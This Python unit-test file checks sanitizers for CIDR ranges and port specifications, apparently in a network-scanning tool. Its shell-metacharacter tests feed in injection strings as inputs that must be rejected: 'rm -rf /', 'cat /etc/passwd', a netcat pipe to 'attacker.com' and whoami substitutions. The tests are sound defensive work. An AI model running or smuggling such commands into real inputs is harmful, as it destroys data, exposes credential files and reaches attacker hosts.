"""Unit tests for utility functions, especially input sanitization.

Tests cover:
- sanitize_cidr: CIDR validation and sanitization
- sanitize_port_spec: Port specification validation and sanitization
"""

from __future__ import annotations

import pytest

from src.utils import sanitize_cidr, sanitize_port_spec


class TestSanitizeCidr:
    """Test cases for sanitize_cidr function."""

    def test_valid_ipv4_cidr(self) -> None:
        """Test validation of valid IPv4 CIDR notation."""
        assert sanitize_cidr("192.168.1.0/24") == "192.168.1.0/24"
        assert sanitize_cidr("10.0.0.0/8") == "10.0.0.0/8"
        assert sanitize_cidr("172.16.0.0/12") == "172.16.0.0/12"

    def test_valid_ipv6_cidr(self) -> None:
        """Test validation of valid IPv6 CIDR notation."""
        assert sanitize_cidr("2001:db8::/32") == "2001:db8::/32"
        assert sanitize_cidr("fe80::/10") == "fe80::/10"
        assert sanitize_cidr("::1/128") == "::1/128"

    def test_cidr_with_whitespace(self) -> None:
        """Test CIDR with leading/trailing whitespace is stripped."""
        assert sanitize_cidr("  192.168.1.0/24  ") == "192.168.1.0/24"
        assert sanitize_cidr("\t10.0.0.0/8\n") == "10.0.0.0/8"

    def test_cidr_with_shell_metacharacters(self) -> None:
        """Test CIDR with shell metacharacters is rejected."""
        with pytest.raises(ValueError, match="contains invalid characters"):
            sanitize_cidr("192.168.1.0/24; rm -rf /")

        with pytest.raises(ValueError, match="contains invalid characters"):
            sanitize_cidr("192.168.1.0/24 && cat /etc/passwd")

        with pytest.raises(ValueError, match="contains invalid characters"):
            sanitize_cidr("192.168.1.0/24|nc attacker.com 1234")

        with pytest.raises(ValueError, match="contains invalid characters"):
            sanitize_cidr("192.168.1.0/24`whoami`")

        with pytest.raises(ValueError, match="contains invalid characters"):
            sanitize_cidr("192.168.1.0/24$(whoami)")

    def test_cidr_with_special_chars(self) -> None:
        """Test CIDR with other special characters is rejected."""
        with pytest.raises(ValueError, match="contains invalid characters"):
            sanitize_cidr("192.168.1.0/24\x00")  # Null byte

    def test_cidr_with_newlines(self) -> None:
        """Test CIDR with newlines at end is stripped and accepted if valid."""
        # Newlines at the end should be stripped
        assert sanitize_cidr("192.168.1.0/24\n") == "192.168.1.0/24"
        assert sanitize_cidr("192.168.1.0/24\r\n") == "192.168.1.0/24"

    def test_empty_cidr(self) -> None:
        """Test empty CIDR is rejected."""
        with pytest.raises(ValueError, match="must be a non-empty string"):
            sanitize_cidr("")

        with pytest.raises(ValueError, match="must be a non-empty string"):
            sanitize_cidr("   ")

    def test_invalid_cidr_format(self) -> None:
        """Test invalid CIDR format is rejected."""
        # "not-a-cidr" contains letters outside hex range, so fails character check
        with pytest.raises(ValueError, match="(Invalid CIDR format|contains invalid characters)"):
            sanitize_cidr("not-a-cidr")

        with pytest.raises(ValueError, match="Invalid CIDR format"):
            sanitize_cidr("999.999.999.999/24")

        with pytest.raises(ValueError, match="Invalid CIDR format"):
            sanitize_cidr("192.168.1.0/99")

    def test_non_string_cidr(self) -> None:
        """Test non-string CIDR is rejected."""
        with pytest.raises(ValueError, match="must be a non-empty string"):
            sanitize_cidr(None)  # type: ignore

        with pytest.raises(ValueError, match="must be a non-empty string"):
            sanitize_cidr(123)  # type: ignore


class TestSanitizePortSpec:
    """Test cases for sanitize_port_spec function."""

    def test_valid_single_port(self) -> None:
        """Test validation of valid single port."""
        assert sanitize_port_spec("80") == "80"
        assert sanitize_port_spec("443") == "443"
        assert sanitize_port_spec("8080") == "8080"

    def test_valid_port_range(self) -> None:
        """Test validation of valid port range."""
        assert sanitize_port_spec("80-443") == "80-443"
        assert sanitize_port_spec("1000-2000") == "1000-2000"
        assert sanitize_port_spec("1-65535") == "1-65535"

    def test_valid_port_list(self) -> None:
        """Test validation of valid port list."""
        assert sanitize_port_spec("80,443,8080") == "80,443,8080"
        assert sanitize_port_spec("22,80,443") == "22,80,443"

    def test_valid_port_exclusions(self) -> None:
        """Test validation of valid port exclusions."""
        assert sanitize_port_spec("!88") == "!88"
        assert sanitize_port_spec("80,443,!88") == "80,443,!88"
        assert sanitize_port_spec("1-1000,!22,!23") == "1-1000,!22,!23"

    def test_valid_protocol_prefixes(self) -> None:
        """Test validation of valid protocol prefixes (masscan format)."""
        assert sanitize_port_spec("T:80") == "T:80"
        assert sanitize_port_spec("U:53") == "U:53"
        assert sanitize_port_spec("T:80,U:53") == "T:80,U:53"
        assert sanitize_port_spec("T:80-443,U:53-5353") == "T:80-443,U:53-5353"

    def test_port_spec_with_whitespace(self) -> None:
        """Test port spec with whitespace is handled."""
        assert sanitize_port_spec("  80,443  ") == "80,443"
        assert sanitize_port_spec("\t1-1000\n") == "1-1000"

    def test_port_spec_with_shell_metacharacters(self) -> None:
        """Test port spec with shell metacharacters is rejected."""
        with pytest.raises(ValueError, match="contains invalid characters"):
            sanitize_port_spec("80; rm -rf /")

        with pytest.raises(ValueError, match="contains invalid characters"):
            sanitize_port_spec("80 && cat /etc/passwd")

        with pytest.raises(ValueError, match="contains invalid characters"):
            sanitize_port_spec("80|nc attacker.com 1234")

        with pytest.raises(ValueError, match="contains invalid characters"):
            sanitize_port_spec("80`whoami`")

        with pytest.raises(ValueError, match="contains invalid characters"):
            sanitize_port_spec("80$(whoami)")

    def test_port_spec_with_invalid_characters(self) -> None:
        """Test port spec with invalid characters is rejected."""
        with pytest.raises(ValueError, match="contains invalid characters"):
            sanitize_port_spec("80.443")  # Dots not allowed

        with pytest.raises(ValueError, match="contains invalid characters"):
            sanitize_port_spec("80/443")  # Slash not allowed

        with pytest.raises(ValueError, match="contains invalid characters"):
            sanitize_port_spec("80 443")  # Space not allowed in middle

        with pytest.raises(ValueError, match="contains invalid characters"):
            sanitize_port_spec("80\x00")  # Null byte

    def test_empty_port_spec(self) -> None:
        """Test empty port spec is rejected."""
        with pytest.raises(ValueError, match="must be a non-empty string"):
            sanitize_port_spec("")

        with pytest.raises(ValueError, match="must be a non-empty string"):
            sanitize_port_spec("   ")

    def test_port_spec_empty_segment(self) -> None:
        """Test port spec with empty segment is rejected."""
        with pytest.raises(ValueError, match="empty segment"):
            sanitize_port_spec("80,,443")

        with pytest.raises(ValueError, match="empty segment"):
            sanitize_port_spec(",80")

    def test_port_out_of_range(self) -> None:
        """Test port out of valid range is rejected."""
        with pytest.raises(ValueError, match="out of range"):
            sanitize_port_spec("0")

        with pytest.raises(ValueError, match="out of range"):
            sanitize_port_spec("65536")

        with pytest.raises(ValueError, match="out of range"):
            sanitize_port_spec("80-99999")

    def test_invalid_port_range(self) -> None:
        """Test invalid port range is rejected."""
        with pytest.raises(ValueError, match="Invalid port range"):
            sanitize_port_spec("443-80")  # Start > end

        with pytest.raises(ValueError, match="Invalid port range format"):
            sanitize_port_spec("80-443-8080")  # Multiple hyphens

    def test_invalid_port_number(self) -> None:
        """Test invalid port number is rejected."""
        # "abc" contains letters, so fails character check
        with pytest.raises(ValueError, match="(Invalid port number|contains invalid characters)"):
            sanitize_port_spec("abc")

        # "80,abc,443" also fails on character check (contains letters)
        with pytest.raises(ValueError, match="(Invalid port number|contains invalid characters)"):
            sanitize_port_spec("80,abc,443")

    def test_non_string_port_spec(self) -> None:
        """Test non-string port spec is rejected."""
        with pytest.raises(ValueError, match="must be a non-empty string"):
            sanitize_port_spec(None)  # type: ignore

        with pytest.raises(ValueError, match="must be a non-empty string"):
            sanitize_port_spec(123)  # type: ignore
